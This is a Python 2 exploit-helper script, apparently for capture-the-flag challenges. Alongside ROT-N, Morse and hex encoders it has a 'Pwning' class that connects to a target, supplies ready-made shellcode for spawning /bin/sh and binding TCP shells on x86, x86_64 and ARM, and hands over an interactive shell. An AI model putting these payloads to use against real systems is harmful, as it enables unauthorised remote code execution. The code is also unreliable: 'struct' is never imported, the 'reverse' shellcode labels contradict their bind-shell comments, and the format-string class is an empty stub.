import os
import socket
import telnetlib
import sys

def _rotN(c, n):
	if "A" <= c and c <= "Z":
		return chr((ord(c) - ord('A') + n) % 26 + ord('A'))

	if "a" <= c and c <= "z":
		return chr((ord(c) - ord('a') + n) % 26 + ord('a'))

	return c

def rotN( st, num=13 ):
	return ''.join( _rotN(ch, num) for ch in st )



table = {'.-' : 'A',    '-...': 'B',   '-.-.': 'C',
	'-..' : 'D',    '.'   : 'E',   '..-.': 'F',
       	'--.' : 'G',    '....': 'H',   '..'  : 'I',
       	'.---': 'J',    '-.-' : 'K',   '.-..': 'L',
       	'--'  : 'M',    '-.'  : 'N',   '---' : 'O',
       	'.--.': 'P',    '--.-': 'Q',   '.-.' : 'R',
       	'...' : 'S',    '-'   : 'T',   '..-' : 'U',
       	'...-': 'V',    '.--' : 'W',   '-..-': 'X',
       	'-.--': 'Y',    '--..': 'Z',

       	'-----': '0',  '.----': '1',  '..---': '2',
       	'...--': '3',  '....-': '4',  '.....': '5',
       	'-....': '6',  '--...': '7',  '---..': '8',
       	'----.': '9',

       	'.-.-.-': '.', '--..--': ',', '..--..': '?',
       	'.----.': "'", '-.-.--': '!', '---...': ':',
       	'-.-.-.': ';', '-...-' : '=', '.-.-.' : '+',
       	'-....-': '-', '.-..-.': '"', '.--.-.': '@'
       	}

def dec_morse( text ):
	text = text.split()
	lookup = table.items()
        res = ''
        for i in range(len(text)):
                for j in range(len(lookup)):
                        if text[i] == lookup[j][0]:
                                res += lookup[j][1]
                                break
	return res

def enc_morse( text ):
	res = '' 
	lookup = dict((v, k) for k, v in table.iteritems())
	for i in text:
		res += lookup[i.upper()] + ' '
	return res

def bin2str(s): return s.decode('hex')
def str2bin(s): return s.encode('hex')

##### Explit Framework #####

class Pwning:

	def __init__(self, target):
		self.HOST = target.split(':')[0]
		self.PORT = int(target.split(':')[1], 10)

		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((self.HOST, self.PORT))
		self.f = self.s.makefile("rw", bufsize=0)


	def shellcode(self, flavor='x86.execve'):
		if flavor == 'x86.execve':
			# http://inaz2.hatenablog.com/entry/2014/03/13/013056
			# execve("/bin/sh", {"/bin/sh", NULL}, NULL)
			return "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
	
		if flavor == 'x86.reverse': 
			# http://shell-storm.org/shellcode/files/shellcode-882.php
			# Shell Bind TCP Shellcode Port 1337
			return "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93" + \
			       "\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80" + \
			       "\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd" + \
    			       "\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73" + \
			       "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
	
		if flavor == 'x86_64.execve':
			# http://inaz2.hatenablog.com/entry/2014/07/04/001851
			# execve("/bin/sh", {"/bin/sh", NULL}, NULL)
			return "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

		if flavor == 'x86_64.reverse': 
			# http://shell-storm.org/shellcode/files/shellcode-895.php
			# Shell Bind TCP Shellcode Port 6969
			return "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x02\xeb\x62" + \
			       "\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f" + \
			       "\xcd\x80\x41\x83\xf9\x04\x75\xf6\x68\x7f\x01\x01\x01\x66\x68\x1b\x39\x66\x6a" + \
			       "\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x31\xc9\x29\xc8\x75\x1b" + \
			       "\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x05\x31\xc0\x50\xeb\x0d\xb0\x0b\xeb\x1f\x5e" + \
			       "\x52\x56\x89\xe1\x89\xf3\xcd\x80\x31\xc0\xb0\x06\xcd\x80\xf3\x90\x0f\x31\xf3" + \
     			       "\x90\xeb\x8b\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68" 
	
		if flavor == 'arm.execve': 
			# http://inaz2.hatenablog.com/entry/2015/03/06/020437
			# execve("/bin/sh", {"/bin/sh", NULL}, NULL)
			return "\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4" + \
			       "\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

	def shell(self):
        	t = telnetlib.Telnet()
        	t.sock = self.s
        	print "4ll y0u n33d i5 5HELL!"
        	t.interact()

	def read_until(self, delim='\n'):
        	data = ''
        	while not data.endswith(delim):
        	        data += self.f.read(1)
        	return data

	def p32(self, data): return struct.pack("<I", data)
	def u32(self, data): return struct.unpack("<I", data)[0]
	def p64(self, data): return struct.pack("<Q", data)
	def u64(self, data): return struct.unpack("<Q", data)[0]


class FSB:
	def __init__(self, header, size):
		self.payload = ''

	def gen(self):
		pass

	def get(self):
		pass